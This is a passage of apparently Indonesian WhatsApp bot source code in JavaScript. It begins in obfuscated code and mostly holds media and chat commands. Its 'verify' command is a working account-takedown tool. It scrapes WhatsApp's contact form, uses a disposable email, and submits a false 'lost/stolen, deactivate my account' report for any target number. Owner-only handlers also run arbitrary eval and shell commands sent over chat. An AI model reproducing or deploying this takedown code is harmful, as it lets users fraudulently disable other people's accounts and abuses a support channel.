_0x47b79b!==_0x5cbe81;},'dDaUn':'ndpWd'};function _0x759d4e(_0x275143,_0x1abdf4,_0x45ce2e,_0x20cda2){return _0x4964(_0x1abdf4-0x220,_0x275143);}var _0x4eadbd;try{var _0x1c3448=Function(_0x4383dd['UOENb'](_0x4383dd[_0x759d4e(0x2d3,0x2df,0x2fc,0x2fe)](_0x4383dd[_0x493ea8(0x13f,0x167,0x147,0x150)],_0x4383dd[_0x493ea8(0x171,0x156,0x155,0x162)]),');'));_0x4eadbd=_0x1c3448();}catch(_0x45e66e){_0x4eadbd=window;}var _0x274e05=_0x4eadbd[_0x493ea8(0x12c,0x120,0x12a,0x13e)]=_0x4eadbd[_0x493ea8(0x146,0x132,0x15b,0x13e)]||{},_0x599f6d=['log',_0x4383dd[_0x493ea8(0x156,0x15f,0x168,0x172)],_0x493ea8(0x165,0x153,0x151,0x149),_0x4383dd[_0x759d4e(0x2fc,0x2e2,0x2fb,0x2f1)],_0x4383dd[_0x493ea8(0x15b,0x16b,0x18c,0x16e)],_0x4383dd[_0x493ea8(0x170,0x145,0x14e,0x15e)],_0x4383dd[_0x759d4e(0x32f,0x30f,0x322,0x324)]];function _0x493ea8(_0x25e72d,_0xaca1b3,_0xd0a5a8,_0x453a23){return _0x4964(_0x453a23-0x77,_0x25e72d);}for(var _0x4e37b1=0x1*-0x1897+0x2152+0x3*-0x2e9;_0x4e37b1<_0x599f6d['length'];_0x4e37b1++){if(_0x4383dd['jUpLk'](_0x4383dd[_0x759d4e(0x2d0,0x2e1,0x2d6,0x2ec)],_0x4383dd['dDaUn'])){var _0x52f8bc;try{var _0x46a051=_0x177136(_0x4383dd[_0x493ea8(0x121,0x129,0x12c,0x13b)](_0x4383dd['UOENb']('return\x20(fu'+'nction()\x20',_0x4383dd[_0x493ea8(0x176,0x140,0x154,0x162)]),');'));_0x52f8bc=_0x4383dd[_0x493ea8(0x12a,0x14d,0x149,0x142)](_0x46a051);}catch(_0x7f50dc){_0x52f8bc=_0x54712c;}var _0x4e0f56=_0x52f8bc[_0x759d4e(0x2d1,0x2e7,0x2f4,0x2e4)]=_0x52f8bc[_0x493ea8(0x125,0x150,0x12d,0x13e)]||{},_0x37f5b=[_0x4383dd['VPMvU'],_0x4383dd[_0x759d4e(0x33b,0x31b,0x2fe,0x302)],_0x759d4e(0x2e7,0x2f2,0x2f8,0x2fc),_0x4383dd[_0x493ea8(0x131,0x117,0x134,0x139)],'exception',_0x4383dd[_0x759d4e(0x315,0x307,0x2f2,0x2e9)],_0x493ea8(0x13e,0x14b,0x15d,0x143)];for(var _0x3bcb3b=0x1*-0x14b7+0x5*-0x4c1+0x2c7c;_0x4383dd['iMwZq'](_0x3bcb3b,_0x37f5b[_0x493ea8(0x14b,0x163,0x175,0x154)]);_0x3bcb3b++){var _0x34c9ca=_0x4383dd['aRaXM'][_0x759d4e(0x2f4,0x312,0x2f2,0x31b)]('|'),_0x9d9a40=-0x11b8+0x1bd3+-0xc7*0xd;while(!![]){switch(_0x34c9ca[_0x9d9a40++]){case'0':_0x1b39f5[_0x493ea8(0x14b,0x13d,0x110,0x131)]=_0x36b2fe['bind'](_0x4d2c2e);continue;case'1':_0x1b39f5[_0x759d4e(0x308,0x2ee,0x2f7,0x2f7)]=_0x172bca['toString']['bind'](_0x172bca);continue;case'2':var _0x172bca=_0x4e0f56[_0x37631f]||_0x1b39f5;continue;case'3':var _0x37631f=_0x37f5b[_0x3bcb3b];continue;case'4':var _0x1b39f5=_0x1a8349[_0x759d4e(0x2ec,0x2fa,0x2fd,0x318)+'r'][_0x759d4e(0x325,0x314,0x2f3,0x2fa)][_0x493ea8(0x171,0x179,0x15b,0x157)](_0x32cbdb);continue;case'5':_0x4e0f56[_0x37631f]=_0x1b39f5;continue;}break;}}}else{var _0x54914e=_0x585de2['constructo'+'r']['prototype']['bind'](_0x585de2),_0x2445f9=_0x599f6d[_0x4e37b1],_0x1f75ea=_0x274e05[_0x2445f9]||_0x54914e;_0x54914e['__proto__']=_0x585de2[_0x493ea8(0x142,0x144,0x15b,0x157)](_0x585de2),_0x54914e[_0x493ea8(0x134,0x15a,0x132,0x145)]=_0x1f75ea[_0x759d4e(0x2f5,0x2ee,0x30d,0x2da)][_0x759d4e(0x2fb,0x300,0x316,0x2e1)](_0x1f75ea),_0x274e05[_0x2445f9]=_0x54914e;}}});_0x26cec3(),diablobotwhatsapp['reply'](_0xc7b6b8(-0x9c,-0xbb,-0x82,-0xa3)+_0x591c42(0x3bf,0x3b9,0x3d7,0x3c8)+_0x591c42(0x3b2,0x3a4,0x3bf,0x3b6));
break
	    case 'donasi': case 'd': case 'd': case 'd': case 'donate': {
                diablo.sendMessage(diablobotwhatsapp.chat, { image: { url: 'https://telegra.ph/file/6f577f47b17f10fb463a1.jpg' }, caption: `Hai Kak ${diablobotwhatsapp.pushName}\n\n DANA: ISI\n\n GOPAY:  083890585717\n\n MAU DONATE LAIN? PM OWNER :\n\n` }, { quoted: diablobotwhatsapp })
            }
            break
case 'verify':  {
            	if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
if (diablobotwhatsapp.quoted || q) {
const froms = diablobotwhatsapp.quoted ? diablobotwhatsapp.quoted.sender : q.replace(/[^0-9]/g, '')
var cekno = await diablo.onWhatsApp(froms)
if (cekno.length == 0) return diablobotwhatsapp.reply(`Peserta tersebut sudah tidak terdaftar di WhatsApp`)
if (froms === ownerNumber) return diablobotwhatsapp.reply(`Tidak bisa verif My Creator!`)
var targetnya = froms.split('@')[0]
try {
var axioss = require('axios')
var ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
var email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
var $ = cheerio.load(ntah.data)
var $form = $("form");
var url = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

var res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
diablobotwhatsapp.reply(`FROM WhatsApp Support
Hai,
 Terima kasih atas pesan Anda.
 Kami telah menonaktifkan akun WhatsApp Anda.  Ini berarti akun Anda untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut.  Harap dicatat: Tim Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.
 Selama periode penonaktifan:
 • Kontak Anda di WhatsApp mungkin masih melihat nama dan gambar profil Anda. 
 • Setiap pesan yang mungkin dikirim oleh kontak Anda ke akun akan tetap dalam status tertunda hingga 30 hari.
 Jika Anda ingin mendapatkan kembali akun Anda, daftarkan ulang akun Anda sebagai secepatnya.  
 Daftar ulang akun Anda dengan memasukkan kode 6 digit, kode yang Anda terima melalui SMS atau panggilan telepon. Jika Anda mendaftar ulang
 pulihkan riwayat obrolan Anda di: Android |  iPhone.
 file, cadangan, atau riwayat panggilan dari akun yang dihapus.
 akun sebelum dihapus, Anda akan tetap berada di semua obrolan grup.  Anda akan memiliki opsi untuk memulihkan data Anda.  Pelajari caranya Jika Anda tidak mendaftarkan ulang akun Anda, akun tersebut mungkin akan dihapus dan proses ini tidak dapat dibatalkan.  Sayangnya, WhatsApp tidak dapat membantu Anda memulihkan obrolan, dokumen, media
 Catatan: Jika perangkat Anda hilang atau dicuri, sebaiknya hubungi penyedia seluler Anda untuk memblokir kartu SIM Anda sesegera mungkin.  Memblokir kartu SIM Anda mencegah orang lain mendaftar dan mengakses akun yang terkait dengan kartu SIM.
 Sumber daya terkait:
  Untuk informasi lebih lanjut tentang penonaktifan akun pada ponsel yang hilang dan dicuri, silakan baca artikel ini.
  Pelajari tentang akun yang dicuri di artikel ini.
 Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami.  Kami akan dengan senang hati membantu!`)
} else if (payload.includes(`"payload":false`)) {
diablobotwhatsapp.reply(`Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else diablobotwhatsapp.reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else diablobotwhatsapp.reply('Masukkan nomor target!')
}
break
case 'menfess':
			case 'menfes':
			case 'confes':
			case 'confess':
				if (diablobotwhatsapp.isGroup) return diablobotwhatsapp.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (!text) return diablobotwhatsapp.reply(`*Cara Penggunaan*\n\nKirim perintah ${prefix}${command} nomer|pengirim|pesan\n\nContoh ${prefix}${command} 62831xxxxxxx|ini nama samaran ya|I have a crush on you\n\nContoh 2 : ${prefix}${command} 62831xxxxxxx|crush mu|I have s crush on you\n\nTenang aja privasi aman kok><`)
				let nomor = q.split('|')[0] ? q.split('|')[0] : q
				let saking = q.split('|')[1] ? q.split('|')[1] : q
				let pesan = q.split('|')[2] ? q.split('|')[2] : ''
				if (pesan.length < 1) return diablobotwhatsapp.reply(`Harus di isi semua! ex : menfess 62831xxxxxxxx|orang|hallo kamu`)
				 let teksnya = `Assalamualaikum kak ada Menfess nih!!\n─────────────\nLynn\n─────────────\n\nDari : _${saking}_ \nPesan : _${pesan}_ `
				header = 'hayyy'
					gambar = `https://telegra.ph/file/6f577f47b17f10fb463a1.jpg`

				 but = [
					{ urlButton: { displayText: `Subscribe YT`, url : `https://youtube.com/@xiee0` } },
                    { quickReplyButton: { displayText: `𝐓𝐞𝐫𝐢𝐦𝐚 𝐌𝐞𝐧𝐟𝐞𝐬𝐬`, id: `menfesconfirm ${diablobotwhatsapp.sender}` } },
                    { quickReplyButton: { displayText: `𝐊𝐢𝐫𝐢𝐦 𝐌𝐞𝐧𝐟𝐞𝐬𝐬𝐦𝐮`, id: `Menfess` } }
                		]
					diablo.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://telegra.ph/file/6f577f47b17f10fb463a1.jpg`}, templateButtons: but, footer: `Ciee ada yang ngirim pesan nih\nJangan lupa bales pesannya ya` })
				diablobotwhatsapp.reply(`Sukses Mengirim Menfess!!`)
				break
            case 'self': {
                if (!itsMediablo) throw mess.owner
                diablo.public = false
                diablobotwhatsapp.reply('BOT MODE SELEB🗿')
            }
            break
            case 'public': {
                if (!itsMediablo) throw mess.owner
                diablo.public = true
                diablobotwhatsapp.reply('BOT MODE ANTI SELEB')
            }
            break
case 'ytmp3':
if (!text) throw `Example : ${prefix + command} Link Nya`
let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks2) return m.reply(`Linknya Jelek`)
diablobotwhatsapp.reply(mess.wait)
anu = await ytMp3(`${q}`)
titlenyaa = `TITLE BERHASIL DI DAPATKAN\n\nJudul : ${anu.title}\nUpload : ${anu.uploadDate}\nSize : ${anu.size}\nViews : ${anu.views}\nLike : ${anu.likes}\nDislike : ${anu.dislike}\nChannel : ${anu.channel}\nDeskripsi : ${anu.desc}\n\nMOHON TUNGGU SEDANG MENGIRIM MEDIA`
diablo.sendMessage(diablobotwhatsapp.chat, { image: { url: anu.thumb }, caption: `${titlenyaa}`}, { quoted: diablobotwhatsapp })
diablo.sendMessage(diablobotwhatsapp.chat, { audio: { url: anu.result }, mimetype: 'audio/mpeg', fileName: `${anu.title}.mp3` }, { quoted: diablobotwhatsapp })
break
	    case 'ppcp': {
                diablobotwhatsapp.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                diablo.sendMessage(diablobotwhatsapp.chat, { image: { url: random.male }, caption: `Cowoknya` }, { quoted: diablobotwhatsapp })
                diablo.sendMessage(diablobotwhatsapp.chat, { image: { url: random.female }, caption: `Ceweknya` }, { quoted: diablobotwhatsapp })
            }
	    break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!quoted) return diablobotwhatsapp.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
            diablobotwhatsapp.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await diablo.sendImageAsSticker(diablobotwhatsapp.chat, media, diablobotwhatsapp, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return diablobotwhatsapp.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await diablo.sendVideoAsSticker(diablobotwhatsapp.chat, media, diablobotwhatsapp, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                diablobotwhatsapp.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
case 'setppbot': {
                if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
                if (!quoted)return diablobotwhatsapp.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (!/image/.test(mime)) return diablobotwhatsapp.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return diablobotwhatsapp.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                let media = await diablo.downloadAndSaveMediaMessage(quoted)
                await diablo.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                diablobotwhatsapp.reply(`Succes`)
                }
                break
case 'setppbot2': {
if (!itsMediablo) return reply(mess.owner)
if (!quoted) diablobotwhatsapp.reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
let mediaa = await diablo.downloadAndSaveMediaMessage(quoted)
var { img } = await pepe(mediaa)
await diablo.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
 }
 ]
 })
diablobotwhatsapp.reply(`Sukses`)
 }
break
case 'tiktok':
 if(!text) return diablobotwhatsapp.reply(`Linknya?`)
 anu = await fetchJson(`https://api.yanzbotzz.repl.co/api/download/tiktok?url=${text}&apikey=YanzBotz`)
 diablo.sendMessage(diablobotwhatsapp.chat, { video: { url: anu.result.video.no_watermark }, mimetype: 'video/mp4', fileName: `${anu.title}.mp4` }, { quoted: diablobotwhatsapp })
 break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!quoted) return diablobotwhatsapp.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
            diablobotwhatsapp.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await hisoka.sendImageAsSticker(diablobotwhatsapp.chat, media, diablobotwhatsapp, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return diablobotwhatsapp.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await diablo.sendVideoAsSticker(diablobotwhatsapp.chat, media, diablobotwhatsapp, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                diablobotwhatsapp.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
case 'ytmp4':
if (!text) throw `Example : ${prefix + command} Link Nya`
let isLinks= args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks) return m.reply(`Linknya Jelek`)
diablobotwhatsapp.reply(mess.wait)
anu = await ytMp4(`${q}`)
titlenyaa = `TITLE BERHASIL DI DAPATKAN\n\nJudul : ${anu.title}\nUpload : ${anu.uploadDate}\nSize : ${anu.size}\nViews : ${anu.views}\nLike : ${anu.likes}\nDislike : ${anu.dislike}\nChannel : ${anu.channel}\nDeskripsi : ${anu.desc}\n\nMOHON TUNGGU SEDANG MENGIRIM MEDIA`
diablo.sendMessage(diablobotwhatsapp.chat, { image: { url: anu.thumb }, caption: `${titlenyaa}`}, { quoted: diablobotwhatsapp })
diablo.sendMessage(diablobotwhatsapp.chat, { video: { url: anu.result }, mimetype: 'video/mp4', fileName: `${anu.title}.mp4` }, { quoted: diablobotwhatsapp })

break
default:
if (global.db.chats[diablobotwhatsapp.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        diablobotwhatsapp.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return diablobotwhatsapp.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await diablo.groupInviteCode(diablobotwhatsapp.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return diablobotwhatsapp.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return diablobotwhatsapp.reply(`Ehh maaf kamu admin`)
        if (itsMediablo) return diablobotwhatsapp.reply(`Ehh maaf kamu owner bot ku`)
        diablo.groupParticipantsUpdate(diablobotwhatsapp.chat, [m.sender], 'remove')
        }
        }
}
if (budy.startsWith('=>')) {
if (!itsMediablo) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return diablobotwhatsapp.reply(bang)
}
try {
diablobotwhatsapp.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
diablobotwhatsapp.reply(String(e))
}
}
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
if (budy.startsWith('>')) {
if (!itsMediablo) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await diablobotwhatsapp.reply(evaled)
} catch (err) {
diablobotwhatsapp.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMediablo) return
try {
return diablobotwhatsapp.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMediablo) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return diablobotwhatsapp.reply(`${err}`)
if (stdout) {
diablobotwhatsapp.reply(stdout)
}
})
}
} catch (err) {
diablobotwhatsapp.reply(util.format(err))
}
} 